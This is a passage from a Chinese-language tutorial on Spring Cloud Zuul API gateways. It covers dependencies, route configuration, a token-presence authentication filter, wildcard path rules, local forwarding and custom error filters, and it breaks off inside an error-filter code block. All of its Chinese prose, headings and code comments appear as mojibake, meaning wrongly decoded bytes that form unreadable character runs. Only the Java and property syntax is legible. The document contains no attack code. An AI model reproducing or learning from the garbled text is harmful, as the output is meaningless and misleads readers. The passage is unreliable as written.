<li><p>åœ¨å¾®æœåŠ¡ä¸­ï¼Œä¸€ä¸ªç‹¬ç«‹çš„ç³»ç»Ÿè¢«æ‹†åˆ†æˆäº†å¾ˆå¤šä¸ªç‹¬ç«‹çš„æœåŠ¡ï¼Œä¸ºäº†ç¡®ä¿å®‰å…¨ï¼Œæƒé™ç®¡ç†ä¹Ÿæ˜¯ä¸€ä¸ªä¸å¯å›é¿çš„é—®é¢˜ï¼Œå¦‚æœåœ¨æ¯ä¸€ä¸ªæœåŠ¡ä¸Šéƒ½æ·»åŠ ä¸Šç›¸åŒçš„æƒé™éªŒè¯ä»£ç æ¥ç¡®ä¿ç³»ç»Ÿä¸è¢«éæ³•è®¿é—®ï¼Œé‚£ä¹ˆå·¥ä½œé‡ä¹Ÿå°±å¤ªå¤§äº†ï¼Œè€Œä¸”ç»´æŠ¤ä¹Ÿéå¸¸ä¸æ–¹ä¾¿ã€‚</p>
</li>
</ol>
<p>ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œå¾®æœåŠ¡æ¶æ„ä¸­æå‡ºäº†APIç½‘å…³çš„æ¦‚å¿µï¼Œå®ƒå°±åƒä¸€ä¸ªå®‰æ£€ç«™ä¸€æ ·ï¼Œæ‰€æœ‰å¤–éƒ¨çš„è¯·æ±‚éƒ½éœ€è¦ç»è¿‡å®ƒçš„è°ƒåº¦ä¸è¿‡æ»¤ï¼Œç„¶åAPIç½‘å…³æ¥å®ç°è¯·æ±‚è·¯ç”±ã€è´Ÿè½½å‡è¡¡ã€æƒé™éªŒè¯ç­‰åŠŸèƒ½ï¼›</p>
<p>é‚£ä¹ˆSpring Cloudè¿™ä¸ªä¸€ç«™å¼çš„å¾®æœåŠ¡å¼€å‘æ¡†æ¶åŸºäºNetflix Zuulå®ç°äº†Spring Cloud Zuulï¼Œé‡‡ç”¨Spring Cloud Zuulå³å¯å®ç°ä¸€å¥—APIç½‘å…³æœåŠ¡ã€‚</p>
<h2 id="8-2-ä½¿ç”¨Zuulæ„å»ºAPIç½‘å…³"><a href="#8-2-ä½¿ç”¨Zuulæ„å»ºAPIç½‘å…³" class="headerlink" title="8.2 ä½¿ç”¨Zuulæ„å»ºAPIç½‘å…³"></a>8.2 ä½¿ç”¨Zuulæ„å»ºAPIç½‘å…³</h2><ol>
<li>åˆ›å»ºä¸€ä¸ªæ™®é€šçš„Spring Bootå·¥ç¨‹åä¸º06-springcloud-api-gatewayï¼Œç„¶åæ·»åŠ ç›¸å…³ä¾èµ–ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸»è¦æ·»åŠ ä¸¤ä¸ªä¾èµ–zuulå’Œeurekaä¾èµ–ï¼š</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--æ·»åŠ spring cloudçš„zuulçš„èµ·æ­¥ä¾èµ–--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!--æ·»åŠ spring cloudçš„eurekaçš„å®¢æˆ·ç«¯ä¾èµ–--&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>åœ¨å…¥å£ç±»ä¸Šæ·»åŠ @EnableZuulProxyæ³¨è§£ï¼Œå¼€å¯Zuulçš„APIç½‘å…³æœåŠ¡åŠŸèƒ½ï¼š</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@EnableZuulProxy</span> <span class="comment">//å¼€å¯Zuulçš„APIç½‘å…³æœåŠ¡åŠŸèƒ½</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Application</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>åœ¨application.propertiesæ–‡ä»¶ä¸­é…ç½®è·¯ç”±è§„åˆ™ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#é…ç½®æœåŠ¡å†…åµŒçš„Tomcatç«¯å£</span><br><span class="line">server.port=<span class="number">8083</span></span><br><span class="line">#é…ç½®æœåŠ¡çš„åç§°</span><br><span class="line">spring.application.name=08-springcloud-eureka-client-zuul</span><br><span class="line">#é…ç½®è·¯ç”±è§„åˆ™zuul.routes.api-zuul.path  ä¸­api-zuul å¯ä»¥ä»»æ„å¡«å†™</span><br><span class="line">#/api-zuul<span class="comment">/** è¡¨ç¤ºè¯·æ±‚çš„æ‹¦æˆªè§„åˆ™ç±»ä¼¼æ‹¦æˆªå™¨çš„æ‹¦æˆªè§„åˆ™ä»¥/api-zuulå¼€å¤´çš„ä»»æ„ç›®å½•ä»¥åŠå­å­™ç›®å½•ä¸­æ‰€æœ‰è¯·æ±‚éƒ½ä¼šè¢«æ‹¦æˆª</span></span><br><span class="line"><span class="comment">zuul.routes.api-zuul.path=/api-zuul/**</span></span><br><span class="line"><span class="comment">#æŒ‡å‘æœåŠ¡åå­— ç”¨äºå¯¹è¿™ä¸ªæœåŠ¡ä¸‹çš„æŸä¸ªå†™ç‰¹å®šè¯·æ±‚è¿›è¡Œæ‹¦æˆª</span></span><br><span class="line"><span class="comment">zuul.routes.api-zuul.serviceId=08-springcloud-eureka-client-zuul-consumer</span></span><br><span class="line"><span class="comment">#é…ç½®APIç½‘å…³åˆ°æ³¨å†Œä¸­å¿ƒä¸Šï¼ŒAPIç½‘å…³ä¹Ÿå°†ä½œä¸ºä¸€ä¸ªæœåŠ¡æ³¨å†Œåˆ°eureka-serverä¸Š</span></span><br><span class="line"><span class="comment">eureka.client.service-url.defaultZone=http://localhost:9100/eureka</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>ä»¥ä¸Šé…ç½®ï¼Œæˆ‘ä»¬çš„è·¯ç”±è§„åˆ™å°±æ˜¯åŒ¹é…æ‰€æœ‰ç¬¦åˆ&#x2F;api-zuul&#x2F;**çš„è¯·æ±‚ï¼Œåªè¦è·¯å¾„ä¸­å¸¦æœ‰&#x2F;api- zuul &#x2F;éƒ½å°†è¢«è½¬å‘åˆ°08-springcloud-eureka-client-zuul-consumeræœåŠ¡ä¸Šï¼Œè‡³äº08-springcloud-eureka-client-zuul-consumeræœåŠ¡çš„åœ°å€åˆ°åº•æ˜¯ä»€ä¹ˆåˆ™ç”±eureka-serveræ³¨å†Œä¸­å¿ƒå»åˆ†æï¼Œæˆ‘ä»¬åªéœ€è¦å†™ä¸ŠæœåŠ¡åå³å¯ã€‚<br>ä»¥æˆ‘ä»¬ç›®å‰æ­å»ºçš„é¡¹ç›®ä¸ºä¾‹ï¼Œè¯·æ±‚ <a href="http://localhost:8080/api-zuul/test">http://localhost:8080/api-zuul/test</a> æ¥å£åˆ™ç›¸å½“äºè¯·æ±‚ <a href="http://localhost:8080/test">http://localhost:8080/test</a><br>(08-springcloud-eureka-client-zuul-consumer æœåŠ¡çš„åœ°å€ä¸º <a href="http://localhost:8080/test)%EF%BC%8C">http://localhost:8080/test)ï¼Œ</a><br>è·¯ç”±è§„åˆ™ä¸­é…ç½®çš„api-zuulæ˜¯è·¯ç”±çš„åå­—ï¼Œå¯ä»¥ä»»æ„å®šä¹‰ï¼Œä½†æ˜¯ä¸€ç»„pathå’ŒserviceIdæ˜ å°„å…³ç³»çš„è·¯ç”±åè¦ç›¸åŒã€‚</p>
<p>å¦‚æœä»¥ä¸Šæµ‹è¯•æˆåŠŸï¼Œåˆ™è¡¨ç¤ºä»¬çš„APIç½‘å…³æœåŠ¡å·²ç»æ„å»ºæˆåŠŸäº†ï¼Œæˆ‘ä»¬å‘é€çš„ç¬¦åˆè·¯ç”±è§„åˆ™çš„è¯·æ±‚å°†è‡ªåŠ¨è¢«è½¬å‘åˆ°ç›¸åº”çš„æœåŠ¡ä¸Šå»å¤„ç†ã€‚</p>
<h2 id="8-3-ä½¿ç”¨Zuulè¿›è¡Œè¯·æ±‚è¿‡æ»¤"><a href="#8-3-ä½¿ç”¨Zuulè¿›è¡Œè¯·æ±‚è¿‡æ»¤" class="headerlink" title="8.3 ä½¿ç”¨Zuulè¿›è¡Œè¯·æ±‚è¿‡æ»¤"></a>8.3 ä½¿ç”¨Zuulè¿›è¡Œè¯·æ±‚è¿‡æ»¤</h2><p>æˆ‘ä»¬çŸ¥é“Spring cloud Zuulå°±åƒä¸€ä¸ªå®‰æ£€ç«™ï¼Œæ‰€æœ‰è¯·æ±‚éƒ½ä¼šç»è¿‡è¿™ä¸ªå®‰æ£€ç«™ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨è¯¥å®‰æ£€ç«™å†…å®ç°å¯¹è¯·æ±‚çš„è¿‡æ»¤ï¼Œä¸‹é¢æˆ‘ä»¬ä»¥ä¸€ä¸ªæƒé™éªŒè¯æ¡ˆä¾‹è¯´è¿™ä¸€ç‚¹ï¼š</p>
<p>1ã€æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªè¿‡æ»¤å™¨ç±»å¹¶ç»§æ‰¿è‡ªZuulFilterï¼Œå¹¶å°†è¯¥Filterä½œä¸ºä¸€ä¸ªBeanï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//è‡ªå®šä¹‰ä¸€ä¸ªè¿‡æ»¤å™¨ç±»ç”¨äºæ‹¦æˆªç”¨æˆ·çš„è¯·æ±‚ å¹¶ç»§æ‰¿Zuulæä¾›çš„è¿‡æ»¤å™¨ç±»</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AuthFilter</span> <span class="keyword">extends</span> <span class="title class_">ZuulFilter</span> &#123;</span><br><span class="line">    <span class="comment">//è¿‡æ»¤å™¨ç±»å‹ å†³å®šå¼åœ¨è¯·æ±‚ä¹‹å‰è¿˜æ˜¯è¯·æ±‚ä¹‹åæŒ‡å®šå½“å‰è¿‡æ»¤å™¨</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">filterType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//è¿”å›preè¡¨ç¤ºè¦åœ¨è¯·æ±‚ä¹‹å‰æ‰§è¡Œè¿‡æ»¤å™¨</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;pre&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//è¿‡æ»¤å™¨çš„æ’åºï¼Œå¦‚æœæœ‰å¤šä¸ªè¿‡æ»¤å™¨é‚£ä¹ˆè¿™äº›è¿‡æ»¤å™¨å°†æŒ‰ç…§è¿”å›å€¼å¤§å°ç›´æ¥æ’åºæ‰§è¡Œ</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">filterOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ˜¯å¦å¯åŠ¨å½“å‰è¿‡æ»¤å™¨å¦‚æœè¿”å›trueè¡¨ç¤ºå°†è¦æ‰§è¡Œè¿™ä¸ªè¿‡æ»¤å™¨ï¼Œå¦‚æœè¿”å›falseè¡¨ç¤ºä¸æ‰§è¡Œè¿™ä¸ªè¿‡æ»¤å™¨</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldFilter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¦‚æœè¿›å…¥å½“å‰è¿‡æ»¤åï¼Œè¿™ä¸ªæ–¹æ³•å°±æ˜¯è¿‡æ»¤å™¨ä¸­å…·ä½“çš„ä¸šåŠ¡é€»è¾‘</span></span><br><span class="line">    <span class="comment">//æ³¨æ„ï¼šè¿™ä¸ªè¿”å›å€¼ç›®å‰ç‰ˆæœ¬æ²¡æœ‰ä»€ä¹ˆç‰¹æ®Šä½œç”¨ å› æ­¤è¿”å› nullå³å¯</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> ZuulException &#123;</span><br><span class="line">        <span class="comment">//è·å–å½“å‰è¯·æ±‚çš„ä¸Šä¸‹æ–‡å¯¹è±¡</span></span><br><span class="line">        RequestContext  requestContext=RequestContext.getCurrentContext();</span><br><span class="line">        <span class="comment">//è·å–å½“å‰è¯·æ±‚å¯¹è±¡</span></span><br><span class="line">        HttpServletRequest request=requestContext.getRequest();</span><br><span class="line">        <span class="comment">//è·å–è¯·æ±‚å‚æ•°ä¸­çš„tokenæ•°æ®ï¼ˆç”¨æˆ·çš„èº«ä»½ä»¤ç‰Œï¼‰</span></span><br><span class="line">        String token=request.getParameter(<span class="string">&quot;token&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(token==<span class="literal">null</span>)&#123;<span class="comment">//è¿›å…¥ifè¡¨ç¤ºå½“å‰è¯·æ±‚ä¸­æ²¡æœ‰æºå¸¦tokenæˆ‘ä»¬ä»»åŠ¡å½“å‰è¯·æ±‚æ˜¯éæ³•è¯·æ±‚</span></span><br><span class="line">            <span class="comment">//é€šçŸ¥ZuulAPIç½‘å…³å½“å‰è¯·æ±‚éæ³•</span></span><br><span class="line">            requestContext.setSendZuulResponse(<span class="literal">false</span>);</span><br><span class="line">            <span class="comment">//è®¾ç½®å“åº”ç¼–ç ä¸º401 è¡¨ç¤ºæƒé™ä¸è¶³</span></span><br><span class="line">            requestContext.setResponseStatusCode(<span class="number">401</span>);</span><br><span class="line">            <span class="comment">//è®¾ç½®å“åº”çš„å¤´æ–‡ä»¶ä¿¡æ¯ä»¥htmlæˆ–æ–‡æœ¬å“åº”ç¼–ç æ ¼å¼ä¸ºutf-8</span></span><br><span class="line">            requestContext.addZuulResponseHeader(<span class="string">&quot;content-type&quot;</span>,<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">            <span class="comment">//è®¾ç½®å“åº”çš„å†…å®¹</span></span><br><span class="line">            requestContext.setResponseBody(<span class="string">&quot;éæ³•è®¿é—®&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;ç”¨æˆ·æºå¸¦äº†èº«ä»½ä»¤ç‰Œéœ€è¦éªŒè¯è¿™ä¸ªèº«ä»½æ˜¯å¦çœŸçš„åˆæ³•&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ï¼ˆ1ï¼‰filterTypeæ–¹æ³•çš„è¿”å›å€¼ä¸ºè¿‡æ»¤å™¨çš„ç±»å‹ï¼Œè¿‡æ»¤å™¨çš„ç±»å‹å†³å®šäº†è¿‡æ»¤å™¨åœ¨å“ªä¸ªç”Ÿå‘½å‘¨æœŸæ‰§è¡Œï¼Œpreè¡¨ç¤ºåœ¨è·¯ç”±ä¹‹å‰æ‰§è¡Œè¿‡æ»¤å™¨ï¼Œå…¶ä»–å€¼è¿˜æœ‰postã€errorã€routeå’Œstaticï¼Œå½“ç„¶ä¹Ÿå¯ä»¥è‡ªå®šä¹‰ã€‚</p>
<p>ï¼ˆ2ï¼‰filterOrderæ–¹æ³•è¡¨ç¤ºè¿‡æ»¤å™¨çš„æ‰§è¡Œé¡ºåºï¼Œå½“è¿‡æ»¤å™¨å¾ˆå¤šæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¯¥æ–¹æ³•çš„è¿”å›å€¼æ¥æŒ‡å®šè¿‡æ»¤å™¨çš„æ‰§è¡Œé¡ºåºã€‚</p>
<p>ï¼ˆ3ï¼‰shouldFilteræ–¹æ³•ç”¨æ¥åˆ¤æ–­è¿‡æ»¤å™¨æ˜¯å¦æ‰§è¡Œï¼Œtrueè¡¨ç¤ºæ‰§è¡Œï¼Œfalseè¡¨ç¤ºä¸æ‰§è¡Œã€‚</p>
<p>ï¼ˆ4ï¼‰runæ–¹æ³•åˆ™è¡¨ç¤ºè¿‡æ»¤çš„å…·ä½“é€»è¾‘ï¼Œå¦‚æœè¯·æ±‚åœ°å€ä¸­æºå¸¦äº†tokenå‚æ•°çš„è¯ï¼Œåˆ™è®¤ä¸ºæ˜¯åˆæ³•è¯·æ±‚ï¼Œå¦åˆ™ä¸ºéæ³•è¯·æ±‚ï¼Œå¦‚æœæ˜¯éæ³•è¯·æ±‚çš„è¯ï¼Œé¦–å…ˆè®¾ç½®ctx.setSendZuulResponse(false); è¡¨ç¤ºä¸å¯¹è¯¥è¯·æ±‚è¿›è¡Œè·¯ç”±ï¼Œç„¶åè®¾ç½®å“åº”ç å’Œå“åº”å€¼ã€‚è¿™ä¸ªrunæ–¹æ³•çš„è¿”å›å€¼ç›®å‰æš‚æ—¶æ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼Œå¯ä»¥è¿”å›ä»»æ„å€¼ã€‚</p>
<p>2ã€é€šè¿‡<a href="http://localhost:8083/api-zuul/test?token=123456%E5%9C%B0%E5%9D%80%E8%AE%BF%E9%97%AE%EF%BC%8C%E5%B0%B1%E4%BC%9A%E8%A2%AB%E8%BF%87%E6%BB%A4%E5%99%A8%E8%BF%87%E6%BB%A4%E3%80%82">http://localhost:8083/api-zuul/test?token=123456åœ°å€è®¿é—®ï¼Œå°±ä¼šè¢«è¿‡æ»¤å™¨è¿‡æ»¤ã€‚</a></p>
<h2 id="8-4-Zuulçš„è·¯ç”±è§„åˆ™"><a href="#8-4-Zuulçš„è·¯ç”±è§„åˆ™" class="headerlink" title="8.4 Zuulçš„è·¯ç”±è§„åˆ™"></a>8.4 Zuulçš„è·¯ç”±è§„åˆ™</h2><p>(1) åœ¨å‰é¢çš„ä¾‹å­ä¸­ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">#é…ç½®è·¯ç”±è§„åˆ™</span><br><span class="line">zuul.routes.api-zuul.path=/api-zuul<span class="comment">/**</span></span><br><span class="line"><span class="comment">zuul.routes.api-zuul.serviceId=08-springcloud-eureka-client-zuul-consumer</span></span><br><span class="line"><span class="comment">å½“è®¿é—®åœ°å€ç¬¦åˆ/api-zuul/**è§„åˆ™çš„æ—¶å€™ï¼Œä¼šè¢«è‡ªåŠ¨å®šä½åˆ°08-springcloud-eureka-client-zuul-consumeræœåŠ¡ä¸Šï¼Œä¸è¿‡ä¸¤è¡Œä»£ç æœ‰ç‚¹éº»çƒ¦ï¼Œè¿˜å¯ä»¥ç®€åŒ–ä¸ºï¼š</span></span><br><span class="line"><span class="comment">zuul.routes.08-springcloud-eureka-client-zuul-consumer =/api-zuul/**</span></span><br></pre></td></tr></table></figure>

<p>zuul.routesåé¢è·Ÿç€çš„æ˜¯æœåŠ¡åï¼ŒæœåŠ¡ååé¢è·Ÿç€çš„æ˜¯è·¯å¾„è§„åˆ™ï¼Œè¿™ç§é…ç½®æ–¹å¼æ›´ç®€å•ã€‚</p>
<p>(2) å¦‚æœæˆ‘ä»¬éœ€è¦ä¸ç»™æŸä¸ªæ¥å£æ·»åŠ æ˜ å°„ï¼Œæ¯”å¦‚è¯´æˆ‘ä¸æƒ³ç»™&#x2F;helloæ¥å£è·¯ç”±ï¼Œé‚£æˆ‘ä»¬å¯ä»¥æŒ‰å¦‚ä¸‹æ–¹å¼é…ç½®ï¼š<br>#å¿½ç•¥æ‰æŸä¸€äº›æ¥å£è·¯å¾„<br>zuul.ignored-patterns&#x3D;&#x2F;<strong>&#x2F;hello&#x2F;</strong><br>æ­¤å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç»Ÿä¸€çš„ä¸ºè·¯ç”±è§„åˆ™å¢åŠ å‰ç¼€ï¼Œè®¾ç½®æ–¹å¼å¦‚ä¸‹ï¼š<br>#é…ç½®ç½‘å…³è·¯ç”±çš„å‰ç¼€<br>zuul.prefix&#x3D;&#x2F;myapi<br>æ­¤æ—¶æˆ‘ä»¬çš„è®¿é—®è·¯å¾„å°±å˜æˆäº†<a href="http://localhost:8080/myapi/api-zuul/test">http://localhost:8080/myapi/api-zuul/test</a><br>(3) è·¯ç”±è§„åˆ™é€šé…ç¬¦çš„å«ä¹‰ï¼š</p>
<table>
<thead>
<tr>
<th>é€šé…ç¬¦</th>
<th>å«ä¹‰</th>
<th>ä¸¾ä¾‹</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>ï¼Ÿ</td>
<td>åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦</td>
<td>&#x2F;05-springcloud-service-feign&#x2F;?</td>
<td>åŒ¹é…  &#x2F;05-springcloud-service-feign&#x2F;a,  &#x2F;05-springcloud-service-feign&#x2F;b,  &#x2F;05-springcloud-service-feign&#x2F;cç­‰</td>
</tr>
<tr>
<td>*</td>
<td>åŒ¹é…ä»»æ„æ•°é‡çš„å­—ç¬¦</td>
<td>&#x2F;05-springcloud-service-feign&#x2F;*</td>
<td>åŒ¹é…  &#x2F;05-springcloud-service-feign&#x2F;aaa,  &#x2F;05-springcloud-service-feign&#x2F;bbb,  &#x2F;05-springcloud-service-feign&#x2F;cccç­‰ï¼Œ  æ— æ³•åŒ¹é…  &#x2F;05-springcloud-service-feign&#x2F;a&#x2F;b&#x2F;c</td>
</tr>
<tr>
<td>**</td>
<td>åŒ¹é…ä»»æ„æ•°é‡çš„å­—ç¬¦</td>
<td>&#x2F;05-springcloud-service-feign&#x2F;**</td>
<td>åŒ¹é…  &#x2F;05-springcloud-service-feign&#x2F;aaa,  &#x2F;05-springcloud-service-feign&#x2F;bbb,  &#x2F;05-springcloud-service-feign&#x2F;cccç­‰ï¼Œ  ä¹Ÿå¯ä»¥åŒ¹é…  &#x2F;05-springcloud-service-feign&#x2F;a&#x2F;b&#x2F;c</td>
</tr>
</tbody></table>
<p>(4) ä¸€èˆ¬æƒ…å†µä¸‹APIç½‘å…³åªæ˜¯ä½œä¸ºå„ä¸ªå¾®æœåŠ¡çš„ç»Ÿä¸€å…¥å£ï¼Œä½†æ˜¯æœ‰æ—¶å€™æˆ‘ä»¬å¯èƒ½ä¹Ÿéœ€è¦åœ¨APIç½‘å…³æœåŠ¡ä¸Šåšä¸€äº›ç‰¹æ®Šçš„ä¸šåŠ¡é€»è¾‘å¤„ç†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è®©è¯·æ±‚åˆ°è¾¾APIç½‘å…³åï¼Œå†è½¬å‘ç»™è‡ªå·±æœ¬èº«ï¼Œç”±APIç½‘å…³è‡ªå·±æ¥å¤„ç†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è¿›è¡Œå¦‚ä¸‹çš„æ“ä½œï¼š</p>
<p>åœ¨08-springcloud-eureka-client-zuulé¡¹ç›®ä¸­æ–°å»ºå¦‚ä¸‹Controllerï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GateWayController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/api/local&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;exec the api gateway.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨application.propertiesæ–‡ä»¶ä¸­é…ç½®ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">zuul.routes.gateway.path=/gateway<span class="comment">/**</span></span><br><span class="line"><span class="comment">zuul.routes.gateway.url=forward:/api/local</span></span><br></pre></td></tr></table></figure>

<h2 id="8-5-Zuulçš„å¼‚å¸¸å¤„ç†"><a href="#8-5-Zuulçš„å¼‚å¸¸å¤„ç†" class="headerlink" title="8.5 Zuulçš„å¼‚å¸¸å¤„ç†"></a>8.5 Zuulçš„å¼‚å¸¸å¤„ç†</h2><p>Spring Cloud Zuulå¯¹å¼‚å¸¸çš„å¤„ç†æ˜¯éå¸¸æ–¹ä¾¿çš„ï¼Œä½†æ˜¯ç”±äºSpring Cloudå¤„äºè¿…é€Ÿå‘å±•ä¸­ï¼Œå„ä¸ªç‰ˆæœ¬ä¹‹é—´æœ‰æ‰€å·®å¼‚ï¼Œæœ¬æ¡ˆä¾‹æ˜¯ä»¥Hoxton.RC2ç‰ˆæœ¬ä¸ºä¾‹ï¼Œæ¥è¯´æ˜Spring Cloud Zuulä¸­çš„å¼‚å¸¸å¤„ç†é—®é¢˜ã€‚</p>
<p>é¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸€å¼ å®˜æ–¹ç»™å‡ºçš„Zuulè¯·æ±‚çš„ç”Ÿå‘½å‘¨æœŸå›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212134883.png" alt="image-20201216225425763"></p>
<ol>
<li><p>æ­£å¸¸æƒ…å†µä¸‹æ‰€æœ‰çš„è¯·æ±‚éƒ½æ˜¯æŒ‰ç…§preã€routeã€postçš„é¡ºåºæ¥æ‰§è¡Œï¼Œç„¶åç”±postè¿”å›response</p>
</li>
<li><p>åœ¨preé˜¶æ®µï¼Œå¦‚æœæœ‰è‡ªå®šä¹‰çš„è¿‡æ»¤å™¨åˆ™æ‰§è¡Œè‡ªå®šä¹‰çš„è¿‡æ»¤å™¨</p>
</li>
<li><p>preã€routingã€postçš„ä»»æ„ä¸€ä¸ªé˜¶æ®µå¦‚æœæŠ›å¼‚å¸¸äº†ï¼Œåˆ™æ‰§è¡Œerrorè¿‡æ»¤å™¨</p>
</li>
</ol>
<p>æˆ‘ä»¬å¯ä»¥æœ‰ä¸¤ç§æ–¹å¼ç»Ÿä¸€å¤„ç†å¼‚å¸¸ï¼š</p>
<ol>
<li>ç¦ç”¨zuulé»˜è®¤çš„å¼‚å¸¸å¤„ç†SendErrorFilterè¿‡æ»¤å™¨ï¼Œç„¶åè‡ªå®šä¹‰æˆ‘ä»¬è‡ªå·±çš„Errorfilterè¿‡æ»¤å™¨</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">zuul.SendErrorFilter.error.disable=<span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ErrorFilter</span> <span class="keyword">extends</span> <span class="title class_">ZuulFilter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(ErrorFilter.class);</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">filterType</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">filterOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldFilter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> ZuulException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RequestContext</span> <span class="variable">context</span> <span class="operator">=</span> RequestContext.getCurrentContext();</span><br><span class="line">            <span class="type">ZuulException</span> <span class="variable">exception</span> <span class="operator">=</span> (ZuulException)context.getThrowable();</span><br><span class="line">            logger.error(<span class="string">&quot;è¿›å…¥ç³»ç»Ÿå¼‚å¸¸æ‹¦æˆª&quot;</span>, exception);</span><br><span class="line">            <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> context.getResponse();</span><br><span class="line">            response.setContentType(<span class="string">&quot;application/json; charset=utf8&quot;</span>);</span><br><span class="line">            response.setStatus(exception.nStatusCode);</span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                writer = response.getWriter();</span><br><span class="line">                writer.print(<span class="string">&quot;&#123;code:&quot;</span>+ exception.nStatusCode +<span 